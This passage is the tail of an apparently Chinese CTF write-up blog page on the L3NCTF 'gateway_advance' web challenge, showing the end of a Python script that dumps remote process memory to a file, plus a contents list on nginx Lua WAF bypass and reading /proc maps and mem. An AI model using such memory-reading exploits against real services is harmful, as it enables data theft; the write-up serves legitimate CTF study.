r.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = read_mem_chunk(start, length)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取成功，前64字节（hex）：<span class="subst">&#123;data[:<span class="number">64</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取成功，前64字节（ascii）：<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> data[:<span class="number">64</span>])&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存到文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;memory_dump.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 已保存到 memory_dump.bin&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1752847881319-69fa787d-65de-4733-9db2-a3e99f7c2e20.png" alt="img"></p>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>Author：<a href="http://example.com">温柔刀</a>
+            <p>Link：<a href="http://example.com/2025/07/18/L3NCTF-Web%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">http://example.com/2025/07/18/L3NCTF-Web%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</a>
+            <p>Publish date：<a href="http://example.com/2025/07/18/L3NCTF-Web%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">July 18th 2025, 3:10:59 pm</a>
+            <p>Update date：<a href="http://example.com/2025/07/18/L3NCTF-Web%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">July 18th 2025, 10:18:04 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/07/18/sqlmap%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%B0%8F%E8%AE%B0/" title="sqlmap源码阅读小记">
+                    <div class="prevTitle">sqlmap源码阅读小记</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+        <script>
+            (function () {
+                const time = document.getElementsByClassName('post-intro-time')[0]
+                const post = document.getElementsByTagName("article")[0]
+                if (time === undefined || post === undefined) {
+                    return
+                }
+
+                const pubTime = new Date(time.innerText)
+                const now = Date.now()
+                const interval = parseInt(now - pubTime)
+                const days = parseInt(interval / 86400000)
+                const outdated_threshold = parseInt(180)
+                if (interval > outdated_threshold * 24 * 3600 * 1000) {
+                    post.innerHTML = '<div class="note note-warning">' +
+                    `<div class="title">文章时效性提示</div><p>这是一篇发布于 ${days} 天前的文章，部分信息可能已发生改变，请注意甄别。` +
+                    '</p></div>' + post.innerHTML;
+                }
+            })();
+        </script>
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:12345@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title="github"></a>
+                <span class="iconfont-archer wechat" title="wechat">
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#gateway-advance"><span class="toc-number">1.</span> <span class="toc-text">gateway_advance</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lua-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.1.</span> <span class="toc-text">lua 是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B-pid-proc-%E5%8F%A5%E6%9F%84-fd-symlink"><span class="toc-number">1.1.2.</span> <span class="toc-text">进程,pid, &#x2F;proc,句柄,fd,symlink</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%EF%BC%88process%EF%BC%89"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">进程（process）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E7%BC%96%E5%8F%B7-PID-Process-ID"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">进程编号 PID (Process ID)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proc"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">&#x2F;proc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6-fd-File-Descriptor"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">文件描述符 fd(File Descriptor)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%B7%B2%E7%BB%8F%E5%88%A0%E9%99%A4%E4%BA%86%EF%BC%8C%E6%88%91%E8%BF%98%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87-fd-%E7%9C%8B%E5%88%B0%E5%AE%83%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9F"><span class="toc-number">1.1.2.4.1.</span> <span class="toc-text">为什么已经删除了，我还可以通过 fd 看到它的内容？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%88%86%E6%B8%85-fd-%E5%92%8C-pid"><span class="toc-number">1.1.2.4.2.</span> <span class="toc-text">怎么分清 fd 和 pid?</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proc-self"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">&#x2F;proc&#x2F;self</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%A5%E6%9F%84-handle"><span class="toc-number">1.1.2.6.</span> <span class="toc-text">句柄(handle)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%EF%BC%88symlink%EF%BC%89"><span class="toc-number">1.1.2.7.</span> <span class="toc-text">符号链接（symlink）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E7%9C%8B%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">看看源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4-waf"><span class="toc-number">1.3.</span> <span class="toc-text">突破 waf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx-lua-waf-bypass"><span class="toc-number">1.3.1.</span> <span class="toc-text">nginx lua waf bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ngx-req-get-uri-args"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">ngx.req.get_uri_args()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%87%BA-flag%EF%BC%88maps-%E5%92%8C-mem%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">读出 flag（maps 和 mem）</span></a></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 14
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/L3NCTF-Web%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">L3NCTF-Web题目部分复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/sqlmap%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%B0%8F%E8%AE%B0/">sqlmap源码阅读小记</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%90%88%E9%9B%86/">反序列化题目合集</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/16</span>
+            <a class="archive-post-title" href="/2025/07/16/Tomcat-JSP-servlet-war%E2%80%94%E2%80%94-WUSTCTF-2020-train-yourself-to-be-godly/">Tomcat,JSP,servlet,war——[WUSTCTF 2020]train yourself to be godly</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span>
+            <a class="archive-post-title" href="/2025/07/15/JAVA%E5%89%8D%E7%BD%AE%E6%A6%82%E5%BF%B5%E5%B0%8F%E8%AE%B0/">JAVA前置概念小记</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span>
+            <a class="archive-post-title" href="/2025/07/13/%E5%B0%8F%E5%88%BB%E4%B9%9F%E8%83%BD%E8%AF%BB%E6%87%82%E7%9A%84%E4%BD%86%E5%BE%85%E6%9B%B4%E2%80%94%E2%80%94-NCTF-2023-EvilMQ/">小刻也能读懂的但待更——[NCTF 2023]EvilMQ</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/09</span>
+            <a class="archive-post-title" href="/2025/07/09/session-%E4%B8%8E%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E2%80%94%E2%80%94-HNCTF-2022-QAQ-1inclu4e/">session 与条件竞争——[HNCTF 2022]QAQ_1inclu4e</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span>
+            <a class="archive-post-title" href="/2025/07/08/SOME-%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94-HCTF-2017-Deserted-place/">SOME 攻击—— [HCTF 2017]Deserted place</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span>
+            <a class="archive-post-title" href="/2025/07/08/PHP-%E5%B8%B8%E8%A7%81%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94-HNCTF-2022-WEEK2-Canyource/">PHP 常见无参函数—— [HNCTF 2022 WEEK2]Canyource </a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/26</span>
+            <a class="archive-post-title" href="/2025/05/26/LitCTF-Web%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/">LitCTF-Web方向题解</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span>
+            <a class="archive-post-title" href="/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/">傻子都能看懂的SSTI入门</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span>
+            <a class="archive-post-title" href="/2025/04/29/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/">红队笔记</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span>
+            <a class="archive-post-title" href="/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">CTFSHOW 刷题汇总</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2025/02/26/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/">自动化漏洞通报</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="wp">
+                <span class="iconfont-archer">&#xe606;</span>
+                wp
+            </span>
+            <span class="sidebar-tag-name" data-tags="JAVA">
+                <span class="iconfont-archer">&#xe606;</span>
+                JAVA
+            </span>
+            <span class="sidebar-tag-name" data-tags="RCE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE
+            </span>
+            <span class="sidebar-tag-name" data-tags="WAF绕过">
+                <span class="iconfont-archer">&#xe606;</span>
+                WAF绕过
+            </span>
+            <span class="sidebar-tag-name" data-tags="PHP">
+                <span class="iconfont-archer">&#xe606;</span>
+                PHP
+            </span>
+            <span class="sidebar-tag-name" data-tags="无参">
+                <span class="iconfont-archer">&#xe606;</span>
+                无参
+            </span>
+            <span class="sidebar-tag-name" data-tags="Tomcat">
+                <span class="iconfont-archer">&#xe606;</span>
+                Tomcat
+            </span>
+            <span class="sidebar-tag-name" data-tags="Java">
+                <span class="iconfont-archer">&#xe606;</span>
+                Java
+            </span>
+            <span class="sidebar-tag-name" data-tags="Nginx">
+                <span class="iconfont-archer">&#xe606;</span>
+                Nginx
+            </span>
+            <span class="sidebar-tag-name" data-tags="SOME">
+                <span class="iconfont-archer">&#xe606;</span>
+                SOME
+            </span>
+            <span class="sidebar-tag-name" data-tags="SSTI">
+                <span class="iconfont-archer">&#xe606;</span>
+                SSTI
+            </span>
+            <span class="sidebar-tag-name" data-tags="session">
+                <span class="iconfont-archer">&#xe606;</span>
+                session
+            </span>
+            <span class="sidebar-tag-name" data-tags="条件竞争">
+                <span class="iconfont-archer">&#xe606;</span>
+                条件竞争
+            </span>
+            <span class="sidebar-tag-name" data-tags="笔记">
+                <span class="iconfont-archer">&#xe606;</span>
+                笔记
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "温柔刀"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
